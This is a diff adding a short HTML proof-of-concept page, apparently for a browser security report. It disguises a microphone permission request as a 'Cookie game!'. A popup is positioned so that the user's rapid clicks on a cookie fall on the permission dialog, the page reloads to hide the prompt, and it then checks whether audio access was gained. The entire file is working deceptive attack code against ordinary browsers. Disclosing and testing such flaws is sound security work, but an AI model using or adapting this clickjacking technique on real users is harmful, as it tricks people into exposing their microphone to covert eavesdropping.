@@ -1,0 +1,36 @@
+<head><meta charset="utf-8"></head>
+<h1>Cookie game!</h1>
+<button id="btn">Start Game</button>
+<div id="game" style="display:none">
+<p>Click the cookie as fast as you can to win!</p>
+<div id="cookie" style="position:absolute;left:285px;top:80px;font-size:27px;cursor:pointer;">🍪</div>
+</div>
+<script>
+const isPopup = !!window.opener;
+const mOffset = [];
+const btn = document.getElementById("btn");
+const game = document.getElementById("game");
+const cookie = document.getElementById("cookie");
+const plat = window.navigator.platform;
+
+if (isPopup) {
+  btn.remove();
+  game.style.display = "block";
+  const movePos = document.location.hash.substring(1).split("_").map(x => parseInt(x) + 10);
+  window.moveTo(...movePos);
+  window.resizeTo(584,480);
+  setTimeout(()=>cookie.onclick = () => window.close(), 750);
+} else {
+  btn.onclick = (e) => {
+    window.open(`poc.html#${window.screenX}_${window.screenY}`,"","popup");
+    setTimeout(()=>
+      navigator.mediaDevices.getUserMedia({"audio": true}).then((stream)=>{
+        // If microphone received, reopen the page to hide permission dialog
+        window.location.reload();
+      }
+    ), 250);
+  };
+  navigator.mediaDevices.enumerateDevices()
+    .then(e=>e.filter(e=>e.kind==="audioinput"&&e.label).length && (document.body.innerText = "Microphone permission available!"));
+}
+</script>
